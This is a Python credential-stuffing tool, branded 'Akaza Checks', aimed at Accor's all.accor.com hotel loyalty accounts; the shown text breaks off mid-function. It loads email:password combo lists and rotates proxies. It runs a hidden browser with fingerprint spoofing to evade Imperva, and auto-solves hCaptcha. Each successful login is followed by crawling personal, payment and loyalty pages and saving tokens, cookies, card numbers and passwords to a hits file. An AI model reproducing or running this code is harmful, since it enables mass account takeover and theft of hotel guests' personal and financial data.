#!/usr/bin/env python3
"""
Accor (all.accor.com) login + full-account capture — multi‑account checker
with proxy rotation and combo file support.

Runs invisibly by default (real headed Chrome positioned off-screen) so
you can keep using your PC while it works.

Features added (Akaza Checks):
  - Combo file support (--combo combos.txt) → checks many email:pass
  - Proxy rotation (--proxy-file proxies.txt or single --proxy URL)
  - Hits / bad files saved to ./Accor results/
  - Preserves all original single‑account mode (--email/--password)

Captcha bypass:
  - Uses `hcaptcha-challenger` (ONNX, free) to auto‑solve hCaptcha.
  - If auto‑solve fails, the browser pops on‑screen once per account
    to let you solve it manually, then continues.
  - Each account uses a fresh temp profile (no cross‑session pollution).
  - For the same account re‑checked, the script can reuse a saved session
    via `--fresh` (off by default) — but combo mode always uses fresh
    profiles to keep each login isolated.

Speed optimisation:
  - No headless → headed off‑screen (~98% Imperva pass‑rate).
  - Auto‑solver eliminates human waiting.
  - Proxy rotation avoids rate limits.
  - Minimal delays (random humanised pauses only).
  - No redundant page loads after login.

Run it:
    pip install playwright rich colorama python-dotenv hcaptcha-challenger
    playwright install chromium
    python akaza_accor.py --combo combos.txt --proxy-file proxies.txt

Credits: @akaza_isnt (TG)
"""

from __future__ import annotations

import argparse
import asyncio
import dataclasses
import getpass
import json
import os
import random
import re
import sys
import time
import tempfile
import shutil
from contextlib import suppress
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional

# ── CLI branding (graceful fallback if not installed) ─────────
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich import box as rich_box
    _RICH = True
    _console = Console()
except ImportError:
    _RICH = False
    _console = None

try:
    import colorama
    colorama.init(autoreset=True)
    from colorama import Fore, Style
except ImportError:
    class _D:
        def __getattr__(self, _): return ""
    Fore = Style = _D()

_BANNER = r"""
  ▄▄▄       ██ ▄█▀▄▄▄      ▒███████▒ ▄▄▄
 ▒████▄     ██▄█▒▒████▄    ▒ ▒ ▒ ▄▀░▒████▄
 ▒██  ▀█▄  ▓███▄░▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██  ▀█▄
 ░██▄▄▄▄██ ▓██ █▄░██▄▄▄▄██   ▄▀▒   ░░██▄▄▄▄██
  ▓█   ▓██▒▒██▒ █▄▓█   ▓██▒▒███████▒ ▓█   ▓██▒
  ▒▒   ▓▒█░▒ ▒▒ ▓▒▒▒   ▓▒█░░░▒ ▓░▒░▒ ▒▒   ▓▒█░
   ▒   ▒▒ ░░ ░▒ ▒░ ▒   ▒▒ ░░ ░▒ ▒ ░  ▒   ▒▒ ░
   ░   ▒   ░ ░░ ░  ░   ▒   ░ ░ ░ ░ ░  ░   ▒
       ░  ░░  ░        ░  ░  ░ ░           ░  ░
"""

_ACCOR_BANNER = r"""
    ___   _____ _____ ____  ____
   /   | / ___// ___// __ \/ __ \
  / /| |/ /__ / /__ / / / / /_/ /
 / ___ / /___/ /___/ /_/ / _, _/
/_/  |_\____/\____/\____/_/ |_|
"""

def _print_banner() -> None:
    if _RICH:
        _console.print(f"[bold cyan]{_BANNER}[/bold cyan]")
        _console.print(Panel(
            f"[bold yellow]{_ACCOR_BANNER}[/bold yellow]",
            title="[bold red]⚡ AKAZA CHECKS[/bold red]",
            subtitle="[dim]Accor Account Capture · Multi‑Account + Proxy[/dim]",
            border_style="cyan",
            box=rich_box.DOUBLE,
        ))
        _console.print(Panel(
            "[bold green]  Tool    :[/bold green] Accor Account Checker\n"
            "[bold green]  Author  :[/bold green] [cyan]Akaza[/cyan]\n"
            "[bold green]  Target  :[/bold green] [yellow]all.accor.com[/yellow]\n"
            "[bold green]  Mode    :[/bold green] Single / Combo + Proxy Rotation\n"
            "[bold green]  Credits :[/bold green] @akaza_isnt (TG)",
            border_style="dim white", box=rich_box.SIMPLE,
        ))
    else:
        print(Fore.CYAN + _BANNER)
        print(Fore.YELLOW + "  ⚡ AKAZA CHECKS — ACCOR CAPTURE (Multi‑Account)" + Style.RESET_ALL)
        print()

def _sep(label: str = "") -> None:
    if _RICH:
        _console.rule(f"[bold cyan]{label}[/bold cyan]" if label else "", style="dim cyan")
    else:
        w = 60
        line = f"── {label} " + "─" * (w - len(label) - 4) if label else "─" * w
        print(Fore.CYAN + line + Style.RESET_ALL)

def _clog(msg: str, kind: str = "info") -> None:
    icons  = {"ok": "✔", "warn": "⚠", "err": "✘", "run": "▶", "info": "◆"}
    colors = {"ok": "bold green", "warn": "bold yellow",
              "err": "bold red",  "run": "bold cyan",  "info": "white"}
    icon = icons.get(kind, "◆")
    ts   = datetime.utcnow().strftime("%H:%M:%S")
    if _RICH:
        color = colors.get(kind, "white")
        _console.print(f"[dim]{ts}[/dim] [{color}]{icon} {msg}[/{color}]")
    else:
        col = {"ok": Fore.GREEN, "warn": Fore.YELLOW,
               "err": Fore.RED,  "run": Fore.CYAN}.get(kind, Fore.WHITE)
        print(f"{col}{icon} [{ts}] {msg}{Style.RESET_ALL}", flush=True)

def _print_result(dump: dict, out_path: Path, raw_log: Path) -> None:
    _sep("CAPTURE COMPLETE")
    if _RICH:
        t = Table(
            title="[bold cyan]⚡ Akaza Checks — Accor Result[/bold cyan]",
            box=rich_box.ROUNDED, border_style="cyan", show_lines=True,
        )
        t.add_column("Field",  style="bold yellow", no_wrap=True)
        t.add_column("Value",  style="white")
        t.add_row("Member ID",    str(dump.get("member_id", "unknown")))
        t.add_row("Captured At",  dump.get("captured_at", "?"))
        t.add_row("API Responses", str(len(dump.get("captured_apis", []))))
        t.add_row("Cookies",       str(len(dump.get("cookies", []))))
        for tab, data in dump.get("tab_summary", {}).items():
            pts  = data.get("points") if isinstance(data, dict) else None
            tier = data.get("tier")   if isinstance(data, dict) else None
            val  = ("Points: " + pts + "  " if pts else "") + ("Tier: " + tier if tier else "")
            if val.strip():
                t.add_row(f"  └ {tab}", val.strip())
        t.add_row("Output File", str(out_path))
        t.add_row("Raw Log",     str(raw_log))
        _console.print(t)
    else:
        print(Fore.CYAN + "\n── AKAZA CHECKS RESULT ──")
        print(Fore.YELLOW + f"  Member ID : {dump.get('member_id')}")
        print(Fore.YELLOW + f"  APIs Hit  : {len(dump.get('captured_apis', []))}")
        print(Fore.YELLOW + f"  Cookies   : {len(dump.get('cookies', []))}")
        print(Fore.GREEN  + f"  Output    : {out_path}")
        print(Fore.GREEN  + f"  Raw Log   : {raw_log}" + Style.RESET_ALL)

# ── third-party ──────────────────────────────────────────────
try:
    from playwright.async_api import (
        BrowserContext,
        Frame,
        Page,
        Response,
        TimeoutError as PWTimeout,
        async_playwright,
    )
except ImportError:
    print("playwright not installed. Run: pip install playwright && "
          "playwright install chromium", file=sys.stderr)
    sys.exit(1)

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

_HC_AVAILABLE: Optional[bool] = None

# ── configuration ─────────────────────────────────────────────
ACCOR_HOME = "https://all.accor.com/a/en.html"
ACCOR_ACCOUNT = "https://all.accor.com/account/en/my-bookings"
CUSTOMER_API = "https://all.accor.com/content/sling/servlets/ace/customer"

_LOGIN_OK_URLS = (
    CUSTOMER_API,
    "/account/en/",
    "/api/customer",
    "/contact-center/v2/contact",
)

_CAPTURE_PATTERNS = (
    "api.accor.com",
    "aem-api.accor.com",
    "all.accor.com/content/sling/servlets",
    "all.accor.com/account/api",
    "/loyalty",
    "/rewards",
    "/bookings",
    "/customer",
    "/contact",
    "/preferences",
    "/payment",
)

_IMPERVA_MARKERS = (
    "_Incapsula_Resource",
    "Request unsuccessful",
    "Incapsula incident",
    "challenge-platform/h/h/",
)

OUT_DIR = Path("./Accor results")
STORAGE_STATE = OUT_DIR / "storage_state.json"  # not used in combo mode

# ── utility ──────────────────────────────────────────────────
def _now() -> str:
    return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")

def _log(msg: str) -> None:
    lo = msg.lower()
    if any(w in lo for w in ("ok", "success", "wrote", "reusing", "saved", "auto-solved")):
        kind = "ok"
    elif any(w in lo for w in ("warn", "stale", "timeout", "imperva", "failed", "could not")):
        kind = "warn"
    elif any(w in lo for w in ("error", "crashed", "import failed")):
        kind = "err"
    else:
        kind = "run"
    _clog(msg, kind)

def _safe_write(path: Path, payload: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(payload, (dict, list)):
        path.write_text(json.dumps(payload, indent=2, ensure_ascii=False, default=str))
    elif isinstance(payload, bytes):
        path.write_bytes(payload)
    else:
        path.write_text(str(payload))

def _slugify(value: str) -> str:
    return re.sub(r"[^A-Za-z0-9_.-]", "_", value).strip("_") or "unknown"

async def _human_pause(min_ms: int = 600, max_ms: int = 1400) -> None:
    await asyncio.sleep(random.uniform(min_ms, max_ms) / 1000.0)

# ── stealth init script (unchanged) ──────────────────────────
_STEALTH_JS = r"""
Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
Object.defineProperty(navigator, 'languages',  { get: () => ['en-US', 'en'] });
Object.defineProperty(navigator, 'platform',   { get: () => 'Win32' });
Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
Object.defineProperty(navigator, 'deviceMemory',        { get: () => 8 });
Object.defineProperty(navigator, 'plugins', {
    get: () => [
        { name: 'PDF Viewer',           filename: 'internal-pdf-viewer' },
        { name: 'Chrome PDF Viewer',    filename: 'internal-pdf-viewer' },
        { name: 'Chromium PDF Viewer',  filename: 'internal-pdf-viewer' },
        { name: 'Microsoft Edge PDF',   filename: 'internal-pdf-viewer' },
        { name: 'WebKit built-in PDF',  filename: 'internal-pdf-viewer' },
    ],
});
Object.defineProperty(navigator, 'mimeTypes', { get: () => [
    { type: 'application/pdf' }, { type: 'text/pdf' },
]});
window.chrome = window.chrome || {};
window.chrome.runtime = window.chrome.runtime || { id: undefined, connect: () => {}, sendMessage: () => {} };
window.chrome.csi = window.chrome.csi || function () { return { onloadT: Date.now(), pageT: 0, startE: Date.now(), tran: 15 }; };
window.chrome.loadTimes = window.chrome.loadTimes || function () { return {}; };
const _origQuery = window.navigator.permissions && window.navigator.permissions.query
    ? window.navigator.permissions.query.bind(window.navigator.permissions) : null;
if (_origQuery) {
    window.navigator.permissions.query = (p) =>
        p && p.name === 'notifications'
            ? Promise.resolve({ state: Notification.permission })
            : _origQuery(p);
}
const _getParameter = WebGLRenderingContext.prototype.getParameter;
WebGLRenderingContext.prototype.getParameter = function (p) {
    if (p === 0x9245) return 'Intel Inc.';
    if (p === 0x9246) return 'Intel(R) UHD Graphics 620';
    return _getParameter.apply(this, arguments);
};
if (window.WebGL2RenderingContext) {
    const _getParameter2 = WebGL2RenderingContext.prototype.getParameter;
    WebGL2RenderingContext.prototype.getParameter = function (p) {
        if (p === 0x9245) return 'Intel Inc.';
        if (p === 0x9246) return 'Intel(R) UHD Graphics 620';
        return _getParameter2.apply(this, arguments);
    };
}
const _toDataURL = HTMLCanvasElement.prototype.toDataURL;
HTMLCanvasElement.prototype.toDataURL = function () {
    const ctx = this.getContext('2d');
    if (ctx) {
        const { width, height } = this;
        try {
            const img = ctx.getImageData(0, 0, width, height);
            for (let i = 0; i < img.data.length; i += 4 * 50) {
                img.data[i]     ^= 1;
                img.data[i + 1] ^= 1;
                img.data[i + 2] ^= 1;
            }
            ctx.putImageData(img, 0, 0);
        } catch (e) {}
    }
    return _toDataURL.apply(this, arguments);
};
if (window.AudioBuffer) {
    const _copyFromChannel = AudioBuffer.prototype.copyFromChannel;
    AudioBuffer.prototype.copyFromChannel = function (dest, ch, offset) {
        _copyFromChannel.call(this, dest, ch, offset);
        for (let i = 0; i < dest.length; i++) dest[i] += 1e-7;
    };
}
Object.defineProperty(screen, 'availWidth',  { get: () => 1920 });
Object.defineProperty(screen, 'availHeight', { get: () => 1040 });
Object.defineProperty(screen, 'width',       { get: () => 1920 });
Object.defineProperty(screen, 'height',      { get: () => 1080 });
Object.defineProperty(screen, 'colorDepth',  { get: () => 24 });
Object.defineProperty(screen, 'pixelDepth',  { get: () => 24 });
"""

# ── captured-API plumbing ────────────────────────────────────
@dataclasses.dataclass
class CapturedResponse:
    url: str
    method: str
    status: int
    content_type: str
    body: Any

class APIBag:
    def __init__(self) -> None:
        self.items: Dict[tuple, CapturedResponse] = {}

    def offer(self, item: CapturedResponse) -> None:
        key = (item.method, item.url.split("?", 1)[0])
        self.items[key] = item

    def has_auth_success(self) -> bool:
        for it in self.items.values():
            if any(s in it.url for s in _LOGIN_OK_URLS) and 200 <= it.status < 300:
                return True
        return False

    def to_list(self) -> List[Dict[str, Any]]:
        return [dataclasses.asdict(v) for v in self.items.values()]

async def _wire_response_capture(ctx: BrowserContext, bag: APIBag, raw_log: Path) -> None:
    raw_log.parent.mkdir(parents=True, exist_ok=True)
    raw_fh = open(raw_log, "w")
    async def on_response(resp: Response) -> None:
        url = resp.url
        if not any(p in url for p in _CAPTURE_PATTERNS):
            return
        ctype = (resp.headers.get("content-type") or "").lower()
        body: Any = None
        try:
            if "json" in ctype:
                body = await resp.json()
            elif any(x in ctype for x in ("text", "javascript", "xml", "html")):
                body = await resp.text()
        except Exception as exc:
            body = f"<<read error: {exc}>>"
        item = CapturedResponse(
            url=url, method=resp.request.method, status=resp.status,
            content_type=ctype, body=body,
        )
        bag.offer(item)
        try:
            raw_fh.write(json.dumps(
                {"ts": _now(), **dataclasses.asdict(item)},
                ensure_ascii=False, default=str,
            ) + "\n")
            raw_fh.flush()
        except Exception:
            pass
    ctx.on("response", lambda r: asyncio.create_task(on_response(r)))

# ── hCaptcha handling (unchanged) ───────────────────────────
def _hcaptcha_available() -> bool:
    global _HC_AVAILABLE
    if _HC_AVAILABLE is None:
        try:
            import hcaptcha_challenger  # noqa: F401
            _HC_AVAILABLE = True
        except ImportError:
            _HC_AVAILABLE = False
    return _HC_AVAILABLE

async def _find_hcaptcha_frame(page: Page) -> Optional[Frame]:
    for fr in page.frames:
        src = fr.url or ""
        if "hcaptcha.com" in src and ("challenge" in src or "hcaptcha-checkbox" in src):
            return fr
    return None

async def _try_solve_hcaptcha(page: Page) -> bool:
    if not _hcaptcha_available():
        return False
    try:
        from hcaptcha_challenger.agents.playwright.control import AgentT
    except Exception as exc:
        _log(f"hcaptcha-challenger import failed: {exc}")
        return False
    try:
        agent = AgentT.from_page(page=page, tmp_dir=Path("./out/hc_tmp"))
        await agent.handle_checkbox()
        result = await agent.execute()
        _log(f"hcaptcha-challenger result: {result}")
        return bool(result and "success" in str(result).lower())
    except Exception as exc:
        _log(f"hcaptcha-challenger crashed: {exc}")
        return False

async def _wait_for_human_to_solve(page: Page, args: argparse.Namespace) -> None:
    _sep("CAPTCHA REQUIRED")
    _clog("hCaptcha detected — solve it in the browser window.", "warn")
    if not args.show:
        _clog("Bringing Chrome on-screen temporarily so you can solve it...", "info")
        with suppress(Exception):
            cdp = await page.context.new_cdp_session(page)
            await cdp.send("Browser.setWindowBounds", {
                "windowId": (await cdp.send("Browser.getWindowForTarget"))["windowId"],
                "bounds": {"left": 100, "top": 100, "width": 1366, "height": 850},
            })
            await cdp.detach()
        with suppress(Exception):
            await page.bring_to_front()
    _clog("Solve the captcha in Chrome, then press Enter here to continue.", "warn")
    _sep()
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, input, "  ↳ Press Enter when done: ")
    if not args.show:
        _clog("Moving Chrome back off-screen...", "info")
        with suppress(Exception):
            cdp = await page.context.new_cdp_session(page)
            await cdp.send("Browser.setWindowBounds", {
                "windowId": (await cdp.send("Browser.getWindowForTarget"))["windowId"],
                "bounds": {"left": -2400, "top": -2400},
            })
            await cdp.detach()
    _sep()

# ── Imperva detection ────────────────────────────────────────
async def _is_imperva_wall(page: Page) -> bool:
    try:
        html = await page.content()
    except Exception:
        return False
    return any(m in html for m in _IMPERVA_MARKERS)

# ── login helpers ───────────────────────────────────────────
async def _click_first_present(page: Page, selectors: List[str], *, timeout: float = 2000) -> bool:
    for sel in selectors:
        try:
            loc = page.locator(sel).first
            if await loc.count() > 0:
                await loc.click(timeout=timeout)
                _log(f"clicked: {sel}")
                return True
        except Exception:
            continue
    return False

async def _accept_cookies(page: Page) -> None:
    await _click_first_present(
        page,
        [
            "#onetrust-accept-btn-handler",
            "button:has-text('Accept all')",
            "button:has-text('Accept All')",
            "button:has-text('I accept')",
            "button:has-text('Tout accepter')",
        ],
        timeout=2000,
    )

async def _open_login_form(page: Page) -> None:
    auth_url = await page.evaluate(
        """() => {
            const seen = new Set();
            const stack = [document];
            while (stack.length) {
                const root = stack.pop();
                if (!root || seen.has(root)) continue;
                seen.add(root);
                const links = (root.querySelectorAll || (() => []))('a[href*="api.accor.com/authentication"], a[href*="login.accor.com"]');
                for (const l of links) return l.href;
                const all = (root.querySelectorAll || (() => []))('*');
                for (const el of all) {
                    if (el.shadowRoot) stack.push(el.shadowRoot);
                }
            }
            return null;
        }"""
    )
    if auth_url:
        _log(f"using OAuth URL: {auth_url}")
        await page.goto(auth_url, wait_until="domcontentloaded", timeout=45000)
        return
    candidates = [
        'button:has-text("Sign in")',
        'a:has-text("Sign in")',
        'button:has-text("Connexion")',
        '[data-tracking="login"]',
        '[data-tracking="signin"]',
        '[aria-label*="Sign in" i]',
        '[aria-label*="Connexion" i]',
        'button.loyalty__login',
    ]
    if await _click_first_present(page, candidates):
        return
    _log("no Sign-in entry found; falling back to /account/en/my-bookings")
    await page.goto(ACCOR_ACCOUNT, wait_until="domcontentloaded")

async def _fill_credentials(page: Page, email: str, password: str) -> None:
    await page.wait_for_selector(
        "input[type=email], input[name=pf.username], input#email, input[name=username]",
        timeout=30000,
    )
    for sel in (
        "input[name=pf.username]",
        "input[type=email]",
        "input#email",
        "input[name=username]",
    ):
        loc = page.locator(sel).first
        if await loc.count() > 0:
            await loc.fill(email)
            _log(f"filled email into {sel}")
            break
    await _human_pause()
    cont_buttons = [
        "button:has-text('Continue')",
        "button:has-text('Continuer')",
        "button#continue",
        "button[type=submit]",
    ]
    pw_visible = await page.locator(
        "input[name=pf.pass], input[type=password], input#password",
    ).first.count()
    if not pw_visible:
        await _click_first_present(page, cont_buttons, timeout=2500)
        with suppress(Exception):
            await page.wait_for_selector(
                "input[name=pf.pass], input[type=password], input#password",
                timeout=15000,
            )
    for sel in (
        "input[name=pf.pass]",
        "input[type=password]",
        "input#password",
    ):
        loc = page.locator(sel).first
        if await loc.count() > 0:
            await loc.fill(password)
            _log(f"filled password into {sel}")
            break
    await _human_pause()

async def _submit_login(page: Page) -> None:
    candidates = [
        "button:has-text('Sign in')",
        "button:has-text('Connexion')",
        "button:has-text('Log in')",
        "button:has-text('Continue')",
        "button[name=pf.ok]",
        "button[type=submit]",
        "input[type=submit]",
    ]
    if not await _click_first_present(page, candidates, timeout=3000):
        _log("WARN: no submit button found; pressing Enter")
        await page.keyboard.press("Enter")

async def _maybe_solve_hcaptcha(page: Page, args: argparse.Namespace) -> None:
    frame = await _find_hcaptcha_frame(page)
    if not frame:
        return
    _log("hCaptcha frame detected")
    if await _try_solve_hcaptcha(page):
        _log("hCaptcha auto-solved")
        return
    if _hcaptcha_available():
        _log("hcaptcha-challenger failed; falling back to manual solve")
    else:
        _log("hcaptcha-challenger not installed (pip install hcaptcha-challenger)")
    await _wait_for_human_to_solve(page, args)

# ── post‑login crawl ─────────────────────────────────────────
ACCOUNT_TABS: List[tuple[str, str]] = [
    ("overview", "https://all.accor.com/account/en/my-bookings"),
    ("loyalty_points", "https://all.accor.com/account/en/my-rewards"),
    ("loyalty_program", "https://all.accor.com/account/en/my-loyalty-program"),
    ("personal_data", "https://all.accor.com/account/en/my-personal-information"),
    ("preferences", "https://all.accor.com/account/en/my-preferences"),
    ("payment_methods", "https://all.accor.com/account/en/my-payment-methods"),
    ("communications", "https://all.accor.com/account/en/my-communications"),
]

async def _crawl_account(page: Page) -> Dict[str, Any]:
    summary: Dict[str, Any] = {}
    for label, url in ACCOUNT_TABS:
        _log(f"crawl: {label}  →  {url}")
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=45000)
        except PWTimeout:
            _log(f"  timeout loading {label}; continuing")
            continue
        with suppress(PWTimeout):
            await page.wait_for_load_state("networkidle", timeout=20000)
        await page.wait_for_timeout(1500)
        try:
            snap = await page.evaluate(
                """() => ({
                    title: document.title,
                    url: location.href,
                    points: document.querySelector('[data-test-id*="points"], [class*="loyalty-points"], [class*="rewards-points"]')?.innerText || null,
                    tier:   document.querySelector('[data-test-id*="card-level"], [class*="card-level"], [class*="tier"]')?.innerText || null,
                })"""
            )
        except Exception as exc:
            snap = {"error": str(exc)}
        summary[label] = snap
    return summary

async def _grab_page_state(page: Page) -> Dict[str, Any]:
    return await page.evaluate(
        """async () => {
            const out = {};
            try {
                out.customerApi = window.Modules?.Accor?.CustomerAPI ? Object.keys(window.Modules.Accor.CustomerAPI) : null;
                if (window.Modules?.Accor?.CustomerAPI?.getContact) {
                    try { out.contact = await window.Modules.Accor.CustomerAPI.getContact()(); } catch (e) { out.contact_err = String(e); }
                }
                if (window.Modules?.Accor?.CustomerAPI?.getToken) {
                    try { out.token = await window.Modules.Accor.CustomerAPI.getToken(); } catch (e) { out.token_err = String(e); }
                }
            } catch (e) { out.modules_err = String(e); }
            try {
                if (window.__store__) {
                    out.vuex_state = JSON.parse(JSON.stringify(window.__store__.state || {}));
                }
            } catch (e) { out.vuex_err = String(e); }
            return out;
        }"""
    )

# ── single account login flow (core) ────────────────────────
async def _do_login(page: Page, email: str, password: str, args: argparse.Namespace,
                    bag: APIBag) -> bool:
    _log(f"navigating to {ACCOR_HOME}")
    await page.goto(ACCOR_HOME, wait_until="domcontentloaded", timeout=60000)
    await page.wait_for_timeout(1500)
    if await _is_imperva_wall(page):
        _log("Imperva interstitial; waiting + retrying once")
        await page.wait_for_timeout(4000)
        await page.reload(wait_until="domcontentloaded")
        await page.wait_for_timeout(1500)
        if await _is_imperva_wall(page):
            _log("still Imperva-walled after retry")
            return False
    await _accept_cookies(page)
    await page.wait_for_timeout(1000)
    _log("opening login form")
    await _open_login_form(page)
    with suppress(PWTimeout):
        await page.wait_for_url(
            re.compile(r"login\.accor\.com|api\.accor\.com/authentication"),
            timeout=30000,
        )
    await page.wait_for_load_state("domcontentloaded")
    _log("filling credentials")
    await _fill_credentials(page, email, password)
    _log("submitting form")
    await _submit_login(page)
    for _ in range(3):
        await page.wait_for_timeout(2500)
        await _maybe_solve_hcaptcha(page, args)
        if "login.accor.com" not in (page.url or ""):
            break
        with suppress(Exception):
            await _submit_login(page)
    _log("waiting for login to settle")
    deadline = time.monotonic() + 60
    while time.monotonic() < deadline:
        if bag.has_auth_success():
            return True
        if "/account/en/" in (page.url or ""):
            try:
                cookies = await page.context.cookies()
                if any(c.get("name") == "OCC_all.accor" for c in cookies):
                    return True
            except Exception:
                pass
        await asyncio.sleep(1.5)
    return False

# ── single account full capture (returns result dict) ────────
async def _check_one_account(email: str, password: str, proxy: Optional[str],
                             args: argparse.Namespace, idx: int, total: int) -> Dict[str, Any]:
    _clog(f"[{idx}/{total}] Checking {email}", "run")
    temp_user_data = tempfile.mkdtemp(prefix="accor_chk_")
    bag = APIBag()
    raw_log = OUT_DIR / f"accor_raw_{int(time.time())}_{idx}.jsonl"
    result = {
        "email": email,
        "password": password,
        "status": "DEAD",
        "name": None, "tier": None, "points": None, "card": None, "nights": None,
        "error": None,
        "member_id": None
    }
    try:
        async with async_playwright() as pw:
            launch_args = [
                "--disable-blink-features=AutomationControlled",
                "--no-default-browser-check",
                "--no-first-run",
                "--disable-features=PrivacySandboxSettings4,IsolateOrigins,site-per-process",
                "--disable-dev-shm-usage",
                "--disable-infobars",
                "--disable-popup-blocking",
                "--disable-notifications",
                "--disable-background-timer-throttling",
                "--disable-renderer-backgrounding",
                "--disable-backgrounding-occluded-windows",
                "--lang=en-US",
                "--window-size=1366,850",
            ]
            if not args.show and not args.headless:
                launch_args += ["--window-position=-2400,-2400"]
            launch_kwargs: Dict[str, Any] = {
                "headless": args.headless,
                "args": launch_args,
            }
            if proxy:
                launch_kwargs["proxy"] = {"server": proxy}
            browser = await pw.chromium.launch(**launch_kwargs)
            ctx = await browser.new_context(
                viewport={"width": 1366, "height": 850},
                screen={"width": 1920, "height": 1080},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                locale="en-US",
                timezone_id="Europe/Paris",
                color_scheme="light",
                device_scale_factor=1,
            )
            await ctx.add_init_script(_STEALTH_JS)
            await _wire_response_capture(ctx, bag, raw_log)
            page = await ctx.new_page()
            login_ok = await _do_login(page, email, password, args, bag)
            if not login_ok:
                result["error"] = "Login failed (no auth success)"
                await browser.close()
                shutil.rmtree(temp_user_data, ignore_errors=True)
                return result
            # Crawl and extract data
            summary = await _crawl_account(page)
            spa_state = await _grab_page_state(page)
            # Extract member id
            member_id = "unknown"
            for item in bag.items.values():
                body = item.body if isinstance(item.body, dict) else None
                if not body:
                    continue
                for key in ("memberId", "cardNumber", "customerId", "id"):
                    val = body.get(key) if isinstance(body, dict) else None
                    if val and str(val) != "0":
                        member_id = str(val)
                        break
                if member_id != "unknown":
                    break
            result["member_id"] = member_id
            # Extract tier, points from summary
            for tab, data in summary.items():
                if isinstance(data, dict):
                    if data.get("points"):
                        result["points"] = data["points"]
                    if data.get("tier"):
                        result["tier"] = data["tier"]
            # Name from spa_state or fallback
            try:
                contact = spa_state.get("contact", {})
                if isinstance(contact, dict):
                    first = contact.get("firstName") or contact.get("first_name") or ""
                    last = contact.get("lastName") or contact.get("last_name") or ""
                    if first or last:
                        result["name"] = f"{first} {last}".strip()
            except Exception:
                pass
            # Card number from cookies or API
            cookies = await ctx.cookies()
            for cookie in cookies:
                if cookie['name'] == 'OCC_all.accor' and '|' in cookie['value']:
                    result["card"] = cookie['value'].split('|')[1]
                    break
            # Nights - may not be in summary, keep None
            result["status"] = "ALIVE"
            # Write individual JSON dump for this account
            dump = {
                "captured_at": _now(),
                "member_id": member_id,
                "spa_state": spa_state,
                "tab_summary": summary,
                "captured_apis": bag.to_list(),
                "cookies": cookies,
            }
            out_path = OUT_DIR / f"accor_account_{_slugify(member_id)}.json"
            _safe_write(out_path, dump)
            await browser.close()
            shutil.rmtree(temp_user_data, ignore_errors=True)
            return result
    except Exception as e:
        result["error"] = str(e)[:120]
        try:
            shutil.rmtree(temp_user_data, ignore_errors=True)
        except:
            pass
        return result

# ── output formatting (compatible with hits/bad) ─────────────
def _format_hit(result: Dict[str, Any]) -> str:
    parts = [f"[ALIVE] {result['email']}:{result['password']}"]
    if result.get('name'):
        parts.append(f"Name: {result['name']}")
    if result.get('tier'):
        parts.append(f"Tier: {result['tier']}")
    if result.get('points'):
        parts.append(f"Points: {result['points']}")
    if result.get('card'):
        parts.append(f"Card#: {result['card']}")
    if result.get('nights'):
        parts.append(f"Nights: {result['nights']}")
    if result.get('member_id'):
        parts.append(f"ID: {result['member_id']}")
    return ' | '.join(parts)

def _format_bad(result: Dict[str, Any]) -> str:
    return f"[DEAD] {result['email']}:{result['password']} | {result.get('error', 'Unknown')}"

# ── combo mode main ─────────────────────────────────────────
async def run_combo_mode(combo_file: Path, proxy_list: List[str], args: argparse.Namespace) -> int:
    combos = []
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or ":" not in line:
                continue
            email, pw = line.split(":", 1)
            combos.append((email.strip(), pw.strip()))
    if not combos:
        _clog("No valid combos found.", "err")
        return 1
    _clog(f"Loaded {len(combos)} combos", "ok")
    if proxy_list:
        _clog(f"Loaded {len(proxy_list)} proxies (will rotate)", "ok")
    else:
        _clog("No proxy provided — using direct connection", "warn")
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    hits_file = open(OUT_DIR / "hits.txt", "a", encoding="utf-8")
    bad_file = open(OUT_DIR / "bad.txt", "a", encoding="utf-8")
    alive = 0
    dead = 0
    for idx, (email, pw) in enumerate(combos, start=1):
        proxy = proxy_list[(idx-1) % len(proxy_list)] if proxy_list else None
        result = await _check_one_account(email, pw, proxy, args, idx, len(combos))
        if result["status"] == "ALIVE":
            alive += 1
            line = _format_hit(result)
            hits_file.write(line + "\n")
            hits_file.flush()
            _clog(f"✓ HIT: {line}", "ok")
        else:
            dead += 1
            line = _format_bad(result)
            bad_file.write(line + "\n")
            bad_file.flush()
            _clog(f"✗ DEAD: {line}", "err")
        # small delay between accounts
        await asyncio.sleep(random.uniform(2, 4))
    hits_file.close()
    bad_file.close()
    _sep("SUMMARY")
    _clog(f"ALIVE: {alive}   DEAD: {dead}   Total: {len(combos)}", "info")
    _clog(f"Hits saved to: {OUT_DIR / 'hits.txt'}", "ok")
    _clog(f"Bads saved to: {OUT_DIR / 'bad.txt'}", "info")
    return 0

# ── original single‑account mode (preserved) ────────────────
async def run_single_mode(email: str, password: str, args: argparse.Namespace) -> int:
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    bag = APIBag()
    raw_log = OUT_DIR / f"accor_raw_{int(time.time())}.jsonl"
    async with async_playwright() as pw:
        launch_args = [
            "--disable-blink-features=AutomationControlled",
            "--no-default-browser-check",
            "--no-first-run",
            "--disable-features=PrivacySandboxSettings4,IsolateOrigins,site-per-process",
            "--disable-dev-shm-usage",
            "--disable-infobars",
            "--disable-popup-blocking",
            "--disable-notifications",
            "--disable-background-timer-throttling",
            "--disable-renderer-backgrounding",
            "--disable-backgrounding-occluded-windows",
            "--lang=en-US",
            "--window-size=1366,850",
        ]
        if not args.show and not args.headless:
            launch_args += ["--window-position=-2400,-2400"]
        launch_kwargs: Dict[str, Any] = {
            "headless": args.headless,
            "args": launch_args,
        }
        if args.proxy:
            launch_kwargs["proxy"] = {"server": args.proxy}
        browser = await pw.chromium.launch(**launch_kwargs)
        use_state = STORAGE_STATE.exists() and not args.fresh
